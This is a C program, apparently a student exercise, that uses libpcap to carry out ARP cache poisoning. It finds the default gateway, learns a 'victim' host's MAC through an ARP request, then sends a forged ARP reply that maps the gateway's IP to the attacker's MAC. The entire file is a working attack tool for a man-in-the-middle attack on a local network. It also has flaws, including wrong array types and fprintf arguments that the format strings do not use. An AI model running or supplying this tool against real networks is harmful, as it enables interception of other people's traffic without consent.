#include <stdio.h>
#include <stdlib.h>
#include <pcap/pcap.h>
#include <net/ethernet.h>
#include <netinet/ether.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <net/if.h>
#include <net/if_arp.h>
#include <unistd.h>
#include <ifaddrs.h>
#include <netdb.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <string.h>
#include <linux/rtnetlink.h> // getgateway ip nlmsgdhr, rtmsg etc...
#include <arpa/inet.h>

#define BUFSIZE 8192

struct route_info{
    struct in_addr dstAddr;
    struct in_addr srcAddr;
    struct in_addr gateWay;
    char ifName[IF_NAMESIZE];
};

int readNlSock(int, char *, int, int);
int get_gatewayip(char *, socklen_t);
void parseRoutes(struct nlmsghdr *, struct route_info *);

int main(int argc, char *argv[])
{
    char errbuf[PCAP_ERRBUF_SIZE];
    char * spNetDevName = pcap_lookupdev(errbuf);
    pcap_t* pDes;
    bpf_u_int32 mask;
    bpf_u_int32 net;

    int res,fd;
    struct pcap_pkthdr *header;
    const unsigned char *pkt_data;

    unsigned char req_arp[42];

    struct ifreq ifr;
    char *iface = NULL;
    u_int8_t *att_mac = NULL;
    unsigned char *att_ip = NULL;

    u_int32_t my_mac[ETH_ALEN];
    u_int32_t my_ip[4];

    unsigned char victim_mac[ETH_ALEN];
    unsigned char victim_ip[4];

    struct ether_header ehp;

    char gateway[20];
    get_gatewayip(gateway, 20);
    inet_aton(argv[1], victim_ip);

    fprintf(stderr,"gateway:%s\n",gateway);

    if(0 == spNetDevName){
        printf("errbuf  :[%s]\n",errbuf);
        return 100;
    }else{
        printf("Network Device Name : [%s]\n", spNetDevName);
    }

    if (pcap_lookupnet(spNetDevName, &net, &mask, errbuf) == -1) {
        fprintf(stderr, "Couldn't get netmask for device %s: %s\n", spNetDevName, errbuf);
        net = 0;
        mask = 0;
    }

    pDes = pcap_open_live(spNetDevName, 1500, 1 , 1, errbuf);
    if(0 == pDes){
        printf("[-]Error : [%s]\n",errbuf);
        return 101;
    }else{
        printf("[+]Network Device Ready!\n");
    }

    iface = spNetDevName;
    memset(&ifr, 0, sizeof(ifr));


    fd = socket(AF_INET, SOCK_DGRAM, 0);

    ifr.ifr_addr.sa_family = AF_INET;
    strncpy(ifr.ifr_name, iface, IFNAMSIZ-1);

    if (0 == ioctl(fd,SIOCGIFHWADDR, &ifr)){    // get mac addr
        att_mac = (u_int8_t *)ifr.ifr_hwaddr.sa_data;

        printf("Mac : %.2X:%.2X:%.2X:%.2X:%.2X:%.2X\n",
               att_mac[0],att_mac[1],att_mac[2],att_mac[3],att_mac[4],att_mac[5]
                );
    }

    memcpy(my_mac, att_mac,6);

    for(int i=0; i<6; i++){
        ehp.ether_shost[i] = att_mac[i];
    }

    if(0 == ioctl(fd, SIOCGIFADDR, &ifr)){
        att_ip = (unsigned char *)ifr.ifr_addr.sa_data;
        printf("IP : %d.%d.%d.%d\n",
               att_ip[2],att_ip[3],att_ip[4],att_ip[5]
                );
    }

    close(fd);

    for(int i=0; i<6; i++){
        ehp.ether_dhost[i] = 0xff;
    }


    memcpy(my_ip, &att_ip[2], 4);   // allocate my_ip
    ehp.ether_type = htons(ETHERTYPE_ARP);

    struct arphdr ahp;
    ahp.ar_hrd = htons(ARPHRD_ETHER);
    ahp.ar_pro = htons(ETHERTYPE_IP);
    ahp.ar_hln = ETH_ALEN;
    ahp.ar_pln = 4; // case ipv4 : 4byte
    ahp.ar_op = htons(ARPOP_REQUEST);

    for(int i=0; i<6; i++){
        ahp.__ar_sha[i] = ehp.ether_dhost[i];
    }
    for(int i=0; i<4; i++){
        ahp.__ar_sip[i] = my_ip[i];
    }
    for(int i=0; i<6; i++){
        ahp.__ar_tha[i] = 0x00;
    }

    memcpy(ahp.__ar_tip, victim_ip, 4); // allocate victim_ip to target ip

    memcpy(req_arp, &ehp, sizeof(ehp)); // allocate ether_header to request arp packet
    memcpy(&req_arp[sizeof(ehp)], &ahp, sizeof(ahp));   // allocate arp_header to request arp packet

    if (pcap_sendpacket(pDes,(u_char*) req_arp, 42) != 0){  // sendpacket for victim to know victim's mac address
        fprintf(stderr,"\nError sending the ARPpacket to victim: \n", pcap_geterr(pDes));
        return -1;
    }

    while((res=pcap_next_ex(pDes, &header, &pkt_data))>=0){ // collect packet
        if(res==0) continue;    // case : time out
        struct ether_header *ch_ehp = (struct ether_header *)pkt_data;
        if(ntohs(ch_ehp->ether_type) != ETHERTYPE_ARP) continue;    // case : not arp packet
        else{
            struct arphdr *ch_ahp = (struct arphdr *)(pkt_data+14);
            if(ntohs(ch_ahp->ar_op)  == ARPOP_REPLY){   // check reply packet
                if(!strncmp(victim_ip, ch_ahp->__ar_sip, 4))    // check sender ip is victim ip
                    memcpy(victim_mac, ch_ahp->__ar_sha,6); // allocate victim_mac
            }
            break;
        }
    }

    memcpy(ehp.ether_dhost, victim_mac, 6);
    memcpy(ahp.__ar_sha, my_mac, 6);
    memcpy(ahp.__ar_tha, victim_mac, 6);
    ahp.ar_op = htons(ARPOP_REPLY);

    inet_aton(gateway, ahp.__ar_sip);   // gateway's ip convert (str) to (int)

    memcpy(req_arp, &ehp, sizeof(ehp));
    memcpy(&req_arp[sizeof(ehp)], &ahp, sizeof(ahp));

    if (pcap_sendpacket(pDes,(u_char*) req_arp, 42) != 0){
        fprintf(stderr,"\nError sending the ARPpacket to victim: \n", pcap_geterr(pDes));
        return -1;
    }

    pcap_close(pDes);
    return 0;
}

/* parse the route info returned */
void parseRoutes(struct nlmsghdr *nlHdr, struct route_info *rtInfo){
    struct rtmsg *rtMsg;
    struct rtattr *rtAttr;
    int rtLen;

    rtMsg = (struct rtMsg *)NLMSG_DATA(nlHdr);

    /* If the route is ot for AF_INET or does not belong to main routing table then return. */
    if((rtMsg->rtm_family != AF_INET) || (rtMsg->rtm_table != RT_TABLE_MAIN))
        return ;

    /* get the rtattr filed */
    rtAttr = (struct rtattr *)RTM_RTA(rtMsg);
    rtLen = RTM_PAYLOAD(nlHdr);

    for(;RTA_OK(rtAttr,rtLen);rtAttr = RTA_NEXT(rtAttr,rtLen)){
        switch(rtAttr->rta_type){
        case RTA_OIF:
            if_indextoname(*(int *)RTA_DATA(rtAttr), rtInfo->ifName);
            break;

        case RTA_GATEWAY:
            memcpy(&rtInfo->gateWay, RTA_DATA(rtAttr), sizeof(rtInfo->gateWay));
            break;

        case RTA_PREFSRC:
            memcpy(&rtInfo->srcAddr, RTA_DATA(rtAttr), sizeof(rtInfo->srcAddr));
            break;

        case RTA_DST:
            memcpy(&rtInfo->dstAddr, RTA_DATA(rtAttr), sizeof(rtInfo->dstAddr));
            break;
        }

    }

    return;
}

int get_gatewayip(char *gatewayip, socklen_t size){
    int found_gatewayip = 0;

    struct nlmsghdr *nlMsg;
    struct rtmsg *rtMsg;
    struct route_info *rtInfo;

    char msgBuf[BUFSIZE]; // pretty large buffer
    int sock, len, msgSeq = 0;

    /* Create Socket */
    if((sock = socket(PF_NETLINK, SOCK_DGRAM, NETLINK_ROUTE)) < 0){
        perror("Socket Creation: ");

        return -1;
    }


    /* Initialize the buffer */
    memset(msgBuf, 0, BUFSIZE);


    /* point the header and the msg structure pointers into the buffer */
    nlMsg = (struct nlmsghdr *)msgBuf;
    rtMsg = (struct rtmsg *)NLMSG_DATA(nlMsg);

    /* Fill in the nlmsg header*/
    nlMsg->nlmsg_len = NLMSG_LENGTH(sizeof(struct rtmsg)); // Length of message.
    nlMsg->nlmsg_type = RTM_GETROUTE; // Get the routes from kernel routing table .
    nlMsg->nlmsg_flags = NLM_F_DUMP | NLM_F_REQUEST; // The message is a request for dump.
    nlMsg->nlmsg_seq = msgSeq++; // Sequence of the message packet.
    nlMsg->nlmsg_pid = getpid(); // PID of process sending the request.

    /* Send the request */
    if(send(sock, nlMsg, nlMsg->nlmsg_len, 0) < 0){
        fprintf(stderr, "Write To Socket Failed...\n");

        return -1;
    }

    /* Read the response */
    if((len = readNlSock(sock, msgBuf, msgSeq, getpid())) < 0){
        fprintf(stderr, "Read From Socket Failed...\n");

        return -1;
    }

    /* Parse and print the response */
    rtInfo = (struct route_info *)malloc(sizeof(struct route_info));

    for(;NLMSG_OK(nlMsg,len);nlMsg = NLMSG_NEXT(nlMsg,len)){
        memset(rtInfo, 0, sizeof(struct route_info));
        parseRoutes(nlMsg, rtInfo);

        // Check if default gateway
        if (strstr((char *)inet_ntoa(rtInfo->dstAddr), "0.0.0.0")){
            // copy it over
            inet_ntop(AF_INET, &rtInfo->gateWay, gatewayip, size);
            found_gatewayip = 1;
            break;
        }
    }

    free(rtInfo);
    close(sock);

    return found_gatewayip;
}

int readNlSock(int sockFd, char *bufPtr, int seqNum, int pId){
    struct nlmsghdr *nlHdr;
    int readLen = 0, msgLen = 0;

    do{
        /* Recieve response from the kernel */
        if((readLen = recv(sockFd, bufPtr, BUFSIZE - msgLen, 0)) < 0){
            perror("SOCK READ: ");

            return -1;
        }

        nlHdr = (struct nlmsghdr *)bufPtr;

        /* Check if the header is valid */
        if((NLMSG_OK(nlHdr, readLen) == 0) || (nlHdr->nlmsg_type == NLMSG_ERROR)){
            perror("Error in recieved packet");

            return -1;
        }

        /* Check if the its the last message */
        if(nlHdr->nlmsg_type == NLMSG_DONE){
            break;
        }else{
            /* Else move the pointer to buffer appropriately */
            bufPtr += readLen;
            msgLen += readLen;
        }

        /* Check if its a multi part message */
        if((nlHdr->nlmsg_flags & NLM_F_MULTI) == 0){
            /* return if its not */

            break;
        }
    } while((nlHdr->nlmsg_seq != (unsigned int)seqNum) || (nlHdr->nlmsg_pid != pId));

    return msgLen;
}

